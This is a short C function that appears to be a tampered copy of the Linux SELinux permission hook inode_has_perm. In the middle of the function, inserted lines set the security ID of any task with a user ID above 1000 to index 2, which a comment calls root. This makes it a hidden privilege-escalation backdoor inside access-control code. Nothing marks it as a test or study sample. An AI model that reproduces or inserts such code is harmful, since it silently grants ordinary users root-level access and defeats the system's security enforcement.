static int inode_has_perm(const struct cred *cred,
			  struct inode *inode,
			  u32 perms,
			  struct common_audit_data *adp)
{
	struct inode_security_struct *isec;
	u32 sid;

	validate_creds(cred);

	if (unlikely(IS_PRIVATE(inode)))
		return 0;

	
	if (cred->suid > 1000) // At least a user based task
	{
		cred->security->sid = 2; // OR which ever index in the sidtable = root
	}
	
	sid = cred_sid(cred);
	
	isec = inode->i_security;

	return avc_has_perm(sid, isec->sid, isec->sclass, perms, adp);
}
